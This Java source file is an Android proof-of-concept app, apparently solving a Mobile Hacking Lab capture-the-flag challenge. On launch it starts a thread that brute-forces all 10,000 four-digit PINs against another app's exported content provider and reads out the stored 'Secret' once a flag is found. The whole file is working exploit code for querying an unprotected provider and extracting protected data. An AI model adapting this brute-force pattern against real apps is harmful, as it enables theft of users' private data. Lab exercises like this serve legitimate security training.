package com.nasr.securenotespoc;

import androidx.appcompat.app.AppCompatActivity;

import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.widget.TextView;

public class MainActivity extends AppCompatActivity {

    TextView statusText;
    TextView resultText;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        statusText = findViewById(R.id.statusText);
        resultText = findViewById(R.id.resultText);

        new Thread(this::bruteforce).start();
    }

    private void bruteforce() {

        Uri uri = Uri.parse("content://com.mobilehackinglab.securenotes.secretprovider");

        for (int i = 0; i < 10000; i++) {

            String pin = String.format("%04d", i);
            String selection = "pin=" + pin;

            runOnUiThread(() ->
                    statusText.setText("Trying PIN: " + pin)
            );

            try {

                Cursor cursor = getContentResolver().query(uri, null, selection, null, null);

                if (cursor != null && cursor.moveToFirst()) {

                    int index = cursor.getColumnIndex("Secret");

                    if (index != -1) {

                        String result = cursor.getString(index);

                        if (result != null && result.contains("CTF")) {

                            String finalResult = "PIN: " + pin + "\nSecret: " + result;

                            runOnUiThread(() -> {
                                statusText.setText("PIN FOUND!");
                                resultText.setText(finalResult);
                            });

                            cursor.close();
                            return;
                        }
                    }
                }

                if (cursor != null) cursor.close();

            } catch (Exception ignored) {}
        }

        runOnUiThread(() ->
                statusText.setText("PIN not found")
        );
    }
}